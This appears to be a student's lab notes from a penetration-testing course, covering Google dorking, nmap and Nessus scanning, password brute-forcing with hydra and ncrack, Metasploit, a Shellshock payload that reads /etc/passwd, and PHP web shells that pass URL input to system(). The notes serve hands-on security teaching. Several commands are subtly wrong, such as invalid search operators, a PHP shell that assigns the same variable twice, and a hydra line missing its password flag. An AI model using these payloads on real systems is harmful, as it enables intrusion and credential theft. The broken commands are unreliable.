# **Lab 1-2**
### **Google Hacking:**
Using Google to search for information about companies is a useful way to find information on possible targets to possibly social engineer or phish your way into their system. Sometimes companies may even leave text files or databases open on the internet for any potential attacker to get into. 

### **Example of Commands:** 
* `website:champlain.edu file:pdf`
* `website:champlain.edu intext:password`
* `website:champlain.edu intitle:Cybersecurity inurl:Program`

Useful Site For Extra Commands: https://ahrefs.com/blog/google-advanced-search-operators/

# **Lab 2-2**
Helpful commands: https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/
### Nmap Commands For Host Discovery:
* `nmap 192.168.4.1 (IP Address) -F (Fast Scan)` - gets open ports helpful when ICMP is blocked
* Spacebar let you see the status of a current running scan
* `nmap -iL ipaddress.txt` - Lets you scan targets from a text file
* `nmap -sS 192.168.4.1` - TCP SYN Scan
* `nmap -A 192.168.4.1` - OS Detection Scan
* `nmap -sV -p 1-1000 192.168.4.1` - Using -sV will detect services on the network and -p is the port or port range
* `nmap -sT 192.168.4.1` - 
* `nmap -sL 192.168.4.1` - 
* `nmap -sn 192.168.4.1` -
* `nmap -p 1-1000` - 
* `nmap -PS 192.168.4.1` -

# **Lab 3-1**
The nmap -sC command lets you run a script scan using the default set of scripts.  
`nmap -sC 192.168.139.128`  
The Nmap -script “non intrusive” command uses all the non intrusive scripts and runs them against the host specified.   
`nmap -script "non intrusive" 192.168.139.128`

# **Lab 3-2**
Using 2 different VMs on host only networking
### **Nessus Scan Steps**
Start Nessus:
`sudo systemctl start nessusd`
Nessus Website Link: https://127.0.0.1:8834/

Go to Policies - New - Advanced Scan  
Name the scan   
Click on Discovery:   
Host Discovery: Uncheck "Test the local host" (so it won't scan the nessus server)  
Port Scanning and Service Discovery: Review options  
* Click on Assessment and review options - choose the default options

* Click on Plugins - Disable all of the "Local Security Checks" plugin families - only work if you are able to log into server

* Save the policy

* Go to Scans to create a new scan, and select a User Defined Policy to scan (the one created previously)

* Add your host-only network as the target (e.g. 192.168.139.0/24)

* Name the scan (recommend using target_policy)

# **Lab 4-1**
`man cewl` - info on cewl command  
`cewl -w wordlist.txt -m 9-12 192.168.4.243/bios`  
-w is the file it creates and writes to and -m is the word length

`rsmangler --file Paden --min 9 --max 12 --output Paden.txt`  
Uses the file Paden and creates a password list with a word length between 9-12 and outputs it as Paden.txt  

Uses ncrack to login to a website using the username dpaden and the different passwords stored in Paden.txt  
`ncrack -user dpaden -P Paden.txt http://192.168.4.246`

Uses hydra to login using ssh using the username duaine.dunston and the different passwords stored in Dunston.txt  
`hydra -l duane.dunston Dunston.txt 192.168.4.246 ssh`  

When using ncrack and hydra syntax matters if you don't use the correct username syntax then you won't be able to login since it only tries that username.  

# **Lab 5-1**
Start Metasploit by using `msfconsole`  

Search metasploit:  
`help search`  
`search usermap_script (module name)`  

Configure Modules:  
`use /auxillary/scanner/ftp/ftp_login (directory of module)`  
`show options` - show the different module options which can be set  
`set USERNAME msfadmin` - sets the username as msfadmin  
`exploit` - starts the module and runs the options that were set  

# **Lab 6-1**  
### **Shellshock**  
`$ var_function=‘() { echo ‘shellshock-example’;}'`  
`$ echo $var_function`  
`() { echo shellshock-example;}    Displays variable as string`  
`$ export var_function `  
`$ bash`  
`bash-3.2$ var_function`  
 Executes Arbitrary Code

`wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://your-ip/cgi-bin/sec335.cgi`  
Downloads a copy of /etc/passwd  
# **Lab 9-1**  
`<?php`   
`$cmd1 = $_GET['cmd1'];`  
`$cmd1 = $_GET['cmd2'];`  
`system($cmd1 .' '.$cmd2)`  
`?>`  
Executes command with separation using &  

`<?php`  
`$str = 'L2V0Yy9wYXNzd2QK'`   
`$pass = base64_decode($str);`  

`$cmd1 = $_GET['cmd'];`  
`system($cmd1 .' '.$pass)`  
`?>`  
Passes the directory /etc/passwd using base64 then decodes it and passes the command into the system function    